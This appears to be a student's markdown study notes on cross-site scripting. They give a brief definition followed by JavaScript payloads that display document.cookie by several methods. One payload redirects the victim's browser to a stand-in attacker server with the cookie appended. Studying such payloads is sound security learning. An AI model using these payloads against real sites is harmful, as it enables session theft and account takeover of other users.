> [!info] **Compendium**
>
> - [[#CROSS-SITE SCRIPTING (XSS)]]
>   - [[#Description]]
>   - [[#Payloads for Data Display]]
>   - [[#Common Encodings]]

# VULNERABILITY NOTES

This file serves as a dedicated space for detailed notes on various vulnerabilities, their exploitation, and mitigation techniques. It is expected that the student will populate this section with their own research and understanding.

---

## CROSS-SITE SCRIPTING (XSS)

### Description
A type of security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. An XSS vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

### Payloads for Data Display
(Research sourced by student)

Once an XSS vulnerability is confirmed, the following methods can be used to display or exfiltrate data, such as `document.cookie`.

#### Console Output
Logs data to the browser's developer console (F12). Useful for stealthy testing as it doesn't disrupt the page for the user.
```javascript
<script>console.log(document.cookie);</script>
```

#### Page Write
Writes data directly into the HTML document, potentially overwriting existing content. Can be disruptive.
```javascript
<script>document.write(document.cookie);</script>
```

#### Element Insert
Replaces the content of a specific HTML element with data. Safer than `document.write` as it's more targeted.
```javascript
// Overwrites the entire body
<script>document.body.innerHTML = document.cookie;</script>

// Targets a specific element by its ID
<script>document.getElementById('target-element-id').innerHTML = document.cookie;</script>
```

#### Create Visible Element
Dynamically creates a new element (e.g., a `<div>`) to display the data without altering existing page content.
```javascript
<script>
  let div = document.createElement('div');
  div.innerHTML = document.cookie;
  document.body.appendChild(div);
</script>
```

#### Location Redirect (Exfiltration)
Redirects the user to an attacker-controlled server, with the data appended as a query parameter in the URL.
```javascript
<script>document.location = 'http://attacker-server.com/?c=' + document.cookie;</script>
```

---

### Common Encodings

#### URL Encoding
Used to represent characters in a URL that might have special meaning.
-   **`%2F`**: Represents the forward slash (`/`). As seen in the `login=test%2Ftest` cookie value, which decodes to `login=test/test`.
